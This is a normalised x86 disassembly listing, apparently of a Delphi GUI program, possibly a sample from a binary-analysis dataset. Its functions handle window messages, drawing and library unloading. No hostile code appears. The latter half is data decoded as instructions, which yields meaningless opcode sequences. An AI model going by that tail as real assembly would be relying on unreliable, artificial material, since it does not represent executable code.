mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_45071c
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_44a35c
sub_43d9f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_43da58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437d18
mov ebx eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_437970
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4377b8
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_437868
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43da5f
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_43da68
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437d18
mov ebx eax
mov ecx [ esi + 0x18 ]
xor edx edx
mov eax ebx
call sub_437970
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4377b8
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_437868
pop esi
pop ebx
retn
sub_43daa0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov edx edi
mov eax esi
call sub_43b30c
sub_43dad4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_43db34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403304
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x28c ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_43c81c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43db3b
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_43db44
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403304
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x28c ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_43c81c
pop esi
pop ebx
retn
sub_43db78
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43dbbc
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_4057d4
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_43dbbc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_43dc04
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_42fe34
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403fa4
pop edi
pop esi
pop ebx
retn
sub_43dc28
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43dcee
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43dbf8
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_43dc04
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40477c
mov eax [ ebp - 0x4 ]
call sub_40479c
mov edi eax
add edi edi
lea eax [ edi + 0x2 ]
push eax
call CoTaskMemAlloc
mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
lea edx [ edi + 0x2 ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_402b5c
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_406ad8
inc ebx
inc [ esi + 0x10 ]
mov ebx 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dcf5
lea eax [ ebp - 0xc ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_404630
retn
sub_43dd14
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_43dbf8
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_43dd40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43ddaf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ddb6
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
mov edx [ r-xdata ]
call sub_404980
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43e008
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42c11c
mov [ esi + 0x5 ] al
call sub_4351dc
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43e7b4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_43e054
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_43e0f4
call sub_42bf5c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_43e088
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43e0f4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43e138
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43e088
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43e184
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43e088
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43e1c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43e088
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43e230
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43e26c
mov [ ecx ] 0xe
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43e2bc
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43e2d9 ]
jmp [ eax * 4 + jump_table_43e342 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43e648
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43e7a3
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43e230
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43e184
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_416f24
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43e7d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43e80b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e812
retn
mov eax [ rw-data ]
call sub_403154
mov eax rw-data
call sub_403f50
sub_43ea9a
inc ebx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
add ah bl
lahf
inc esp
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
insb
outsd
jb r-xdata
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
dec ebp
inc esp
add [ eax ] ah
sahf
inc esp
add [ eax - 0x62 ] dl
inc esp
add [ esi + edi * 4 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
add bh bh
sub al 0x15
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
push esp
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
add [ edi + eax * 2 ] ch
inc esp
add [ ebx ] bl
add bh bh
xor al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
dec eax
push ebp
inc ecx
add [ ecx + eax ] ch
[ edx + 0x10044 ]
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
fwait
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
mov edx gs
inc ebx
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
in al dx
jmp 0xffffffffe9bbeadd
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x44471473
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
add bh bh
rcr [ edi - 0x6023ffbc ] 0x44
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
push [ eax + 0x15 ]
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
dec esp
lahf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
outsd
insb
mov [ edx ] ch
inc edx
add [ eax ] ch
add bh bh
adc al 0x9f
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add bh bh
jo r-xdata
jb r-xdata
add [ eax + 0x1 ] al
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
jae r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
adc [ eax ] al
adc eax 0x15a00044
inc esp
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
outsb
je r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ ebx ] bl
add [ edx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
jmp esp
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942eea1
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
jns r-xdata
call 0x1b1ee0b
add bh bh
in al 0x15
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx + 0x70ff0000 ] bl
lahf
inc esp
add [ eax ] bh
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
mov eax 0xd000444f
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec edi
inc esp
add al dl
jo r-xdata
push edi
inc ecx
add [ eax ] ah
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
popfd
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
inc [ eax ]
push ss
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ ebp + edx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add bh bh
test [ 0x10044 ] dl
lahf
inc esp
mov es [ ebp ]
jl r-xdata
inc esp
outsd
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
inc esp
jb r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
dec esp
push eax
outsd
jo r-xdata
jo r-xdata
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
add al bh
int1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 - 0xe19ffbd ] dh
jb r-xdata
add [ eax ] eax
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
push edi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax ] bl
sbb [ eax + eax + 0x54 ] al
sbb al [ eax + eax + 0x10 ]
sbb al [ eax + eax - 0x44 ]
sbb eax [ eax + eax - 0x7c ]
sbb al [ eax + eax + 0x34 ]
sbb al [ eax + eax - 0x18 ]
sbb al [ eax + eax + 0x20 ]
sbb eax [ eax + eax + 0x8 ]
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
test [ edi ] bl
inc esp
add ah al
pop ds
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add [ edi + edx ] bh
and [ edx ] al
add [ eax ] al
and [ esi + 0x44 ] bl
inc esp
jb r-xdata
inc ebp
outsb
add [ eax ] eax
push edi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
[ eax ]
push edi
inc ecx
add [ eax ] ch
inc ebx
add [ eax ] ah
add al [ eax ]
add [ eax + 0x3c0043f0 ] al
pop ss
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
dec esp
je r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xf1
inc ebx
add dh ah
int1
cmp al dh
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
